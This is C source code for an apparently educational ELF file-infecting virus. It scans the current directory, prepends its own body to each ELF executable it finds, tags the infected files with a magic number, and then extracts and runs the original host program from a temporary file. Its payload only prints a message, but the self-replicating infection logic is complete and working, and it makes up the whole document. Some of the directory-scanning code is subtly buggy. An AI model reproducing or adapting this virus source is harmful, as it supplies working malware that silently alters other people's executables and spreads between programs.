/* 
 * This is a trivial ELF file infector.  It simply pre-pends itself
 * to the beginning of ELF executibles.  When it runs it copies the
 * later half of itself to a temporary file and executes it.  Then
 * it deletes the temp file.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <dirent.h>
#include <elf.h>
#include <fcntl.h>
#include <pwd.h>

// PARASITE_LENGTH the size of compiling virus //
#define PARASITE_LENGTH 18128
//infection rate indicator
#define MAGIC 6585
#define TMPFILE_TEMPLATE "/tmp/.virusXXXXXX"
#define MAX_BUF 1024

static int magic = MAGIC;

//virus file infication
int infect(char *filename, int hd, char *virus)
{
    //temp file handle
   int fd;
   //file info
   struct stat stat;
   char *data;
   char tmpfile[MAX_BUF];
   char cmd[MAX_BUF]="\0";
   int tmagic;	  // Store files magic number
   int magicloc;  // Location of magic number
   Elf32_Ehdr ehdr;

/* check file for ELF program, binary linux program */
   if(read(hd,&ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 1;

   if(
	ehdr.e_ident[0] != ELFMAG0 ||
	ehdr.e_ident[1] != ELFMAG1 ||
	ehdr.e_ident[2] != ELFMAG2 ||
	ehdr.e_ident[3] != ELFMAG3
     ) return 1;

   //if (ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) return 1;
   //if (ehdr.e_machine != EM_386) return 1;
   //if (ehdr.e_version != EV_CURRENT) return 1;
//


/* check for magic (virus identificator) at the end of the file */
   if(fstat(hd, &stat) < 0) return 1;
   magicloc = stat.st_size - sizeof(magic);
   if( lseek(hd, magicloc, SEEK_SET) != magicloc ) return 1;

   //load magic character, infection rate
   if(read(hd, &tmagic, sizeof(magic)) != sizeof(magic)) return 1;
   //only infect if not already infected
   if(tmagic == MAGIC) return 1;
   if(lseek(hd, 0, SEEK_SET) != 0) exit(1);

/* Create temp file and self-extraction to temp file*/
   strncpy(tmpfile, TMPFILE_TEMPLATE, MAX_BUF);
   fd=mkstemp(tmpfile);
   if(fd<0) { printf("open(%s)",tmpfile);exit(1); }
   if (write(fd, virus, PARASITE_LENGTH) != PARASITE_LENGTH) return 1;

/* memory allocation for new infected file*/
   data=(char *)malloc(stat.st_size);
   if(data==NULL) return 1;
   if(read(hd, data, stat.st_size) != stat.st_size) return 1;

/* add infected file at the end of virus, to the temp file*/
   if(write(fd,data, stat.st_size) != stat.st_size) return 1;
/* mark file as infected*/
   if(write(fd,&magic, sizeof(magic)) != sizeof(magic)) return 1;

/* permission and ownership*/
   if(fchown(fd, stat.st_uid, stat.st_gid) < 0) return 1;
   if(fchmod(fd, stat.st_mode) < 0) return 1;
/* rename temp file to original, now infected file*/
   sprintf(cmd,"cp %s %s",tmpfile,filename);
   //printf("%s\n",cmd);
   if(system(cmd) != 0) return 1;

   close(fd);

   printf("***Infected %s.\n", filename);

   return 0;
}

//search current directory for executable ELF files
void scan_dir(char *directory, char *virus)
{
   int hd, vd;
   int filecnt;
   DIR *dd;
   struct dirent *dirp;
   struct stat stat;
   char vfile[256];
 
   /* open directory */
   dd = opendir(directory);
   
   // step through the entire directory 
   
   if(dirp != NULL) {
	while (dirp = readdir(dd)) 
	{
	strncpy(vfile, directory, 255);
	strcat(vfile, "/");
	strncat(vfile, dirp->d_name, 255-strlen(vfile));
	    hd=open(vfile, O_RDONLY, 0);
	    if(hd >= 0) {
		fstat(hd, &stat);
		 if(S_ISREG(stat.st_mode)) {
			vd=open(vfile, O_RDWR, 0);
			if(vd >= 0)
				infect(vfile, vd, virus);
		}
		close(vd);
	    }
	    close(hd);
	}
	closedir(dd);
   }
   
}

//seemingly malicious code
void payload(void)
{
   sleep(3); // line added to prevent fork bombing
   printf("Malicious code...\n");
}

int main(int argc, char *argv[], char *envp[])
{
   int fd, tmpfd;
   struct stat stat;
   int len;
   char *data1, virus[PARASITE_LENGTH];
   char tmpfile[MAX_BUF];
   pid_t pid;
   
   /* get info on the file*/
   fd=open(argv[0], O_RDONLY, 0);
   if (fstat(fd, &stat) < 0) return 1;

   
   //load virus to memory
   if (read(fd, virus, PARASITE_LENGTH) != PARASITE_LENGTH) return 1;

   /* execute malicioud code */
   payload();
   //search in current directory
   scan_dir(".", virus);

   
   //get the location of original code in original not infected file
   len = stat.st_size - PARASITE_LENGTH;
   data1=(char*)malloc(len);
   if(data1 == NULL) return 1;
   if(lseek (fd, PARASITE_LENGTH, SEEK_SET) != PARASITE_LENGTH) return 1;

   /* load infected program code */
   if(read(fd, data1, len) != len) return 1; 
   close(fd);

   /* write non-infected code to temp file */
   strncpy(tmpfile, TMPFILE_TEMPLATE, MAX_BUF);
   tmpfd = mkstemp(tmpfile);
   if(tmpfd <0) return 1;
   if (write(tmpfd, data1, len) != len) return 1;
   fchmod(tmpfd, stat.st_mode);
   free(data1);
   close(tmpfd);

   /* create copy of current process */
   pid = fork();
   if (pid <0) exit(1);
   //launch extracted non-infected program
   if(pid ==0) exit(execve(tmpfile, argv, envp));
   //wait for the non-infected program and virus program to finish
   if(waitpid(pid, NULL, 0) != pid) exit(1);
   unlink(tmpfile);
   exit(0);

   return 0;
}
